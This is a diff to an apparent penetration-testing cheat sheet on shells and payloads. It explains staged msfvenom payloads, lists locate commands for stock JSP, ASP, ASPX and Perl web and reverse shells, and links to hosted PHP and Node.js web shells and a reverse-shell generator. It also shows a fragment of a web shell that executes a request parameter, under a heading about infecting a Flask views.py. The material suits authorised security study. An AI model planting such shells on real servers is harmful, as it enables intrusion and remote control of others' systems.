@@ -1,6 +1,6 @@
 # Shell and Some Payloads
 ## Payload Structure - msfvenom
--> A staged payload is usually shipped in two parts. The first part contains a small primary payload that will establish a connection, transferring a larger secondary payload with the rest of the shellcode.
+-> A staged payload is usually shipped in two parts. The first part contains a small primary payload that will establish a connection, transferring a larger secondary payload with the rest of the shellcode.  
 -> e.g.  
 ```
 windows/shell_reverse_tcp (stageless)
@@ -103,14 +103,20 @@ https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Rev
 ### JSP
 -> Find and edit
 ```
-locate jsp-reverse.jsp
+locate cmdjsp.jsp
 ```
 
-### Perl
--> Find and edit
+### ASP
 ```
-locate perl-reverse-shell.pl
+locate cmd-asp-5.1.asp
+locate cmdasp.asp
 ```
+
+### ASPX
+```
+locate cmdasp.aspx
+```
+
 ### Webshell Infecting views.py - Python (Flask)
 ```
 import os
@@ -146,8 +152,16 @@ res.send(Exec(req.params.command))
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
 
+
+### Perl
+-> Find and edit
+```
+locate perl-reverse-shell.pl
+```
+
+#### (=) revshell generator + urlencoder
+-> revshells
 https://www.revshells.com/
 
-## Web Shells
-
+-> urlencoder  
 https://www.urlencoder.org/
